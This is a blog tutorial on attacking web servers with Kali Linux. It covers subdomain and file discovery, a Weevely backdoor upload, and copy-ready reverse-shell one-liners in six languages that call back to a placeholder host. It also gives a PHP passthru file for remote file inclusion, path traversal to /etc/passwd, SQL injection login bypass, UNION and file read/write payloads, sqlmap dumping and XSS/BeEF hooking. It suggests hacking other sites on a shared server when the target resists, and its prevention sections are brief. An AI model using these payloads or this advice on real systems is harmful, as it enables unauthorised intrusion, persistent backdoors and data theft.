Title: Web Penetration Testing with Kali Linux
Date: 2020-05-xx
Author: Jack McKew
Category: Software, infosec
Tags: software, infosec

This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: <https://www.kali.org/downloads/>.

This post is apart of a series of posts, see the other posts at:

- INSERT NETWORK POST
- INSERT ACCESS POST

> Thank you to Chris B for helping me with the notes in this post below!

- [Web Information Gathering](#web-information-gathering)
    - [Discovering Subdomains](#discovering-subdomains)
    - [Discovering Sensitive Files](#discovering-sensitive-files)
- [Exploiting Server Vulnerabilities](#exploiting-server-vulnerabilities)
    - [Exploiting File Upload Vulnerabilities to Gain Access](#exploiting-file-upload-vulnerabilities-to-gain-access)
    - [Exploiting Code Execution Vulnerabilities](#exploiting-code-execution-vulnerabilities)
        - [Bash](#bash)
        - [PERL](#perl)
        - [Python](#python)
        - [PHP](#php)
        - [Ruby](#ruby)
        - [Netcat](#netcat)
    - [Local File Inclusion](#local-file-inclusion)
    - [Remote File Inclusion](#remote-file-inclusion)
- [Prevention of Web Server Exploits](#prevention-of-web-server-exploits)
- [SQL Injection and Attacks](#sql-injection-and-attacks)
    - [Discovering SQL Injections with Form Submissions (POST)](#discovering-sql-injections-with-form-submissions-post)
    - [Bypassing Logins via Injections](#bypassing-logins-via-injections)
    - [Discovering SQL Injections in Data Retrieval (GET)](#discovering-sql-injections-in-data-retrieval-get)
    - [Read and Writing Files on the Server via SQL.](#read-and-writing-files-on-the-server-via-sql)
        - [Reading](#reading)
        - [Writing](#writing)
    - [Use SQLmap to do the Above and More](#use-sqlmap-to-do-the-above-and-more)
    - [Prevention of SQL Vulnerabilities](#prevention-of-sql-vulnerabilities)
- [CROSS SITE SCRIPTING(XSS)](#cross-site-scriptingxss)
    - [Prevention of XSS Vulnerabilities](#prevention-of-xss-vulnerabilities)
- [To Automatically Discover Web Vulnerabilities](#to-automatically-discover-web-vulnerabilities)

## Web Information Gathering

As per the last two posts, information is power is security. So we always start by gathering as much information as possible about the target as this may inform us on the best way to carry out an attack.

Some helpful tools for learning information about websites are:

1. <http://whois.domaintools.com/>
    - Find info about the owner of the target, also possibly webserver results. Look at hosting and info, possibly for social engineering.
2. <https://sitereport.netcraft.com/>
    - Shows technologies used on the target. Look at the technologies used for exploits, and coding languages used (code your virus in  languages that the server can understand).  
3. <https://www.exploit-db.com/>
    - Database of exploits, make sure versions match.
4. <https://www.robtex.com/>
    - Comprehensive DNS information.

Several websites can be installed on a single computer (same IP). If you cannot get into your target try to hack into another website. Another way of getting websites on the same IP (other than Robtex) is to go to bing and search `ip:[target_ip]`.

### Discovering Subdomains

Use a tool called knock (typically install into /opt on Kali). As with most of the tools on Kali linux, Knock is open source and can be found <https://github.com/guelfoweb/knock>.

1. `git clone <https://github.com/guelfoweb/knock.git>`
2. cd into the folder.
3. run it using, `python knock.py [target]`
    - if doesn't work try running the above with --resolve , then run the above again.

Subdomains sometimes contain beta testing applications and scripts. look for exploits in these areas.

### Discovering Sensitive Files

Use [dirb](https://tools.kali.org/web-applications/dirb) (use `man dirb` for help). DIRB is a web content scanner, which looks for existing (or hidden) Web Objects. DIRB works by launching a dictionary attack against a web server and analyses the response (essentially just try different file names and see if it has a response).

1. `dirb [target] [wordlist] [options]`
2. a / usually means you are in a directory.
3. phpinfo.php - very useful information, robots.txt -hidden information that admins don't want us to see.

## Exploiting Server Vulnerabilities

The following are a series of ways to exploit web servers for different outcomes.

### Exploiting File Upload Vulnerabilities to Gain Access

Using a tool called [Weevely](https://tools.kali.org/maintaining-access/weevely). Weevely is a stealthy web shell to simulate a telnet-like connection. This is useful as a backdoor and/or to manage web accounts on a web server.

1. `weevly generate [password] [path+filename]` - create backdoor
2. upload the file.
3. `weevly [url_to_file]` - connect to the file
4. `help` - help

Before trying to use tools just browse the website and get a feel for it, look for exploits in features, specifically if the website allows for an upload.

### Exploiting Code Execution Vulnerabilities

1. Always experiment with any input boxes you see, as they are executing a command, you might be able to change the command.
2. Can use && or ; in unix to execute multiple commands in one line. Test if input box allows this.
3. Most servers have python and netcat.
4. Listen for incoming connections, example using netcat:
    - `netcat -vv -l -p [port]` - listens for connections on port 8080
    - ie. nc -e /bin/sh [ip] [port] - netcat connection.

Following this are a list of commands that you could execute to get a reverse connection for different supported languages. Where the variable to change denoted by `[HOST_IP]` and optionally to change the port. Note that these are all 'one-liners' so they could be executed in input boxes.

#### Bash

``` bash
bash -i >& /dev/tcp/[HOST_IP]/8080 0>&1
```

#### PERL

``` perl
perl -e 'use Socket;$i="[HOST_IP]";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Python

``` python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST_IP]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

``` php
php -r '$sock=fsockopen("[HOST_IP]",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Ruby

``` ruby
ruby -rsocket -e'f=TCPSocket.open("[HOST_IP]",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat

``` bash
nc -e /bin/sh [HOST_IP] 8080
```

### Local File Inclusion

Allows an attacker to read ANY file on the same server. Allows access of outside www folder. /etc/passwd contains all the users for the current os. Go back into the directories to find the above file. So if the url contains something like `page=include.php`, do something like `page=/../../../../../etc/passwd`. What this does is by instead of loading the specific file that was originally targeted, we can load something that it wasn't intending to load from the same server.

### Remote File Inclusion

If doing this on an actual server the file you want to access has to have a real IP or domain name.

1. create a php file with the following:

``` php
<?php

passthru("[command]");

?>
```

passthru executes system commands. For example use the netcat command as above.

Ensure this file is stored on a webserver that the target can access. Make sure the file extension is `.txt` not `.php` or it runs on your webserver.

1. Listen for connections. `nc -vv -l -p [port]`
2. Under the `page=` part paste the location of your php file. and add a ? to the end to exe as php eg. `page=[ip]/[file]?`

## Prevention of Web Server Exploits

The above only happens because the server allows it and is misconfigured.

1. File upload vulnerabilities 
    - Do not allow unsafe files to be uploaded.
    - If you are asking for an image ensure it is an image, never allow exe uploads.
    - Check the file type, not the extension.
2. Code exec vulnerabilities
    - Do'nt use dangerous functions,
    - Filter the input before execution
    - If you have to use function make sure you analyse the input before exec.
    - Use regular expressions (regex).
3. File inclusion vulnerabilties
    - Disable the allow_url_fopen and allow_url_include settings in php (in the /etc/php5/cgi/php.ini)
    - Use static file inclusion (hard code the files)

## SQL Injection and Attacks

Obligatory XKCD comic on SQL injection attacks:

[![Bobby Tables]({static img/exploits_of_a_mom.png})](https://xkcd.com/327/)

To connect to a mySQL database `mysql -u [username] -h [IP of server]`

1. `show databases;`
2. `use [database];`
3. `show tables;`

### Discovering SQL Injections with Form Submissions (POST)

1. Whenever you see an input box try to break it, try using AND, ORDER BY or '.
2. Look for subtle changes.
3. Enter correct info then ' then use AND, use a # as a comment to terminate early.

An example of this is a user/password input box(s) may potentially be making a SQL query like `SELECT * from accounts where user='$USER_INPUT_BOX_VALUE' and password='$PASSWORD_INPUT_BOX_VALUE'`. We could run an injection on this query by setting our password as `123456' AND 1=1#`. This would hopefully execute and confirm that we could inject any SQL query into the webserver database (such as show all passwords).

### Bypassing Logins via Injections

Another neat use would be to inject the SQL query such that the query ends up as `SELECT * from accounts where user='admin' and password='wrong_password' or 1=1`, this would potentially log us in as admin without knowing the password at all as the second case in the and statement will be True if the query evaluates 1 to be equal to 1.

### Discovering SQL Injections in Data Retrieval (GET)

1. Always try to inject things in the php scripts (in the address bar it will look like index.php&username=xxxx&password=xxxxx)
2. Use ORDER BY after a field eg. `index.php&username=xxxx' ORDER BY 1 #&password=xxxxx` Ensure to use the URL encoding for symbols ie. # = %23
3. Order By column 100000 will return an error keep doing order by 1,2,3,4,5 and when you get an error you know the db has that amount of columns
4. Use a union
5. eg. `index.php&username=xxxx' union 1,2,3,4,5 #&password=xxxxx`
6. Swap the numbers with other stuff ie. `1,database(),user(),version(),5`
7. `union select 1, table_name, null, null,5 from information_schema.tables`

### Read and Writing Files on the Server via SQL.

We can also use SQL injections to read/write files that located on the target computer as well.

#### Reading

` union select null, load_file('/etc/passwd'), null, null,null `

#### Writing

`union select null, 'example example', null, null,null into outfile '[path]'`

### Use SQLmap to do the Above and More

1. `sqlmap --help`
2. `sqlmap -u "[target_url]"`
3. `sqlmap -u "[target_url]" --dbs`
    - to get the databases
4. `sqlmap -u "[target_url]" --current-user`
    - to get user
5. `sqlmap -u "[target_url]" --current-db`
    - current database
6. `sqlmap -u "[target_url]" --tables -D [database]`
    - gets the tables in the -D database
7. `sqlmap -u "[target_url]" --columns -T [table_name] -D [database]`
    - gets columns in the tables of the database
8. `sqlmap -u "[target_url]" -T [table_name] -D [database] --dump`
    - Get all the data in the table of the database

### Prevention of SQL Vulnerabilities

- Use filters (but can be bypassed)
- Use a deny list or allow list. (but can be bypassed)
- Best method is to code the web application in a way that does not allow code injection.

To do the above you must use parameterised statements. (where the data and the code are separated)

1. Prepare you statement most languages have a function for it.
    - So the statement is static and only the value will be inserted eg. prepare(select * from username where username = ?) then when the statement is executed if it will search for the raw input data
2. Use filters as second line.
3. Use a user with the least amount of privileges needed.

## CROSS SITE SCRIPTING(XSS)

Executed on the people browsing the website not the server. Allows javascript injection onto the page. Code is executed when the page loads.

3 main types

1. Persistent/Stored XSS
2. Reflected XSS - non persistent xss. only will work if the target visits a specially crafted url eg. `target.com/page.php?something=<script>alert('xss')</script>`
3. DOM based XSS

Test text boxes and urls with parameters (the php stuff).

Inject beef hook into vulnerable pages. If text areas have a max length, go into developer console and inspect element and change the max length.

### Prevention of XSS Vulnerabilities

- Minimize input.
- Convert user input to the html character symbol so `&nsb` and instead of & use `&jsjs;`.
- Escape the input.
- Rarely trust alerts within the browser!

## To Automatically Discover Web Vulnerabilities

Use Zed Attack Proxy (zap) <https://owasp.org/www-project-zap/>, this is already installed on Kali.

1. Search in apps ZAP
2. You have to get this app via github.
3. `chmod +x [name]`
4. Run it
5. After install click no persistent.
6. The cog icon on the left allows options to be modified
7. If you click the green plus on the bottom window then go to active scans. then the little panel in the top left the the windows you can change policies.
8. Add the url in automated scan.
9. Bottom left under alerts, is where all the vulnerabilities that have been discovered are displayed.
10. If you right click one of the alerts (bottom left) then open in browsers it will show you the exploit and how it got it.
